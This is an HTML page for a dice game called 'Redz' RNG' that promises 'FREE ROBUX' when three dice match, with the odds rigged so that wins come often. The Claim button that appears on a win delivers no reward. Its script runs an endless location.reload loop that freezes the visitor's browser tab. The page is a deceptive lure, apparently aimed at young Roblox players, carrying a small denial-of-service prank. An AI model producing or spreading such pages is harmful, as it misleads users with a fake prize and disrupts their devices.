<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redz' RNG</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: #d11a2a; /* Red background */
      color: white;
      text-align: center;
      padding: 50px;
    }
    h1 {
      font-size: 50px;
      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
      margin-bottom: 30px;
    }
    p {
      font-size: 20px;
      margin-bottom: 20px;
      font-weight: bold;
    }
    .dice {
      font-size: 60px;
      margin: 20px;
      color: #f1f1f1;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
      display: inline-block;
      padding: 10px 20px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 10px;
    }
    .button {
      padding: 15px 30px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 20px;
      background-color: #ff4444; /* Red color */
      color: white;
      border: none;
      border-radius: 8px;
      transition: all 0.3s ease;
    }
    .button:hover {
      background-color: #ff1e1e; /* Darker red on hover */
    }
    #claimButton {
      background-color: #32CD32; /* Green claim button */
      display: none;
    }
    #claimButton:hover {
      background-color: #228B22; /* Darker green on hover */
    }
  </style>
</head>
<body>

  <h1>Redz' RNG</h1>
  <p>Welcome. Roll 3 dice, and if all 3 match, you win! Click claim to get your reward of FREE ROBUX.</p>
  
  <div id="dice-container">
    <span class="dice" id="die1">-</span>
    <span class="dice" id="die2">-</span>
    <span class="dice" id="die3">-</span>
  </div>
  
  <button class="button" id="rollButton">Roll Dice</button>
  <br><br>
  <button class="button" id="claimButton">Claim</button>
  
  <script>
    function rollDice() {
      // Generate random number between 1 and 6 for each die
      return Math.floor(Math.random() * 6) + 1;
    }

    function updateDiceDisplay() {
      // Roll 3 dice and update the UI
      const die1 = rollDice();
      let die2 = rollDice();
      let die3 = rollDice();

      // Introduce a small chance that two dice will match
      if (Math.random() < 0.2) {
        die2 = die1;  // 20% chance die2 matches die1
      }
      if (Math.random() < 0.2) {
        die3 = die1;  // 20% chance die3 matches die1
      }

      document.getElementById('die1').textContent = die1;
      document.getElementById('die2').textContent = die2;
      document.getElementById('die3').textContent = die3;

      // Check if all dice match
      if (die1 === die2 && die2 === die3) {
        document.getElementById('claimButton').style.display = 'inline-block'; // Show Claim button when winning
        alert("You win! Click Claim to proceed.");
      } else {
        document.getElementById('claimButton').style.display = 'none'; // Hide Claim button
      }
    }

    document.getElementById('rollButton').onclick = updateDiceDisplay;

    document.getElementById('claimButton').onclick = function() {
      while (1) {
        location.reload(1);
      }
    };
  </script>
  
</body>
</html>
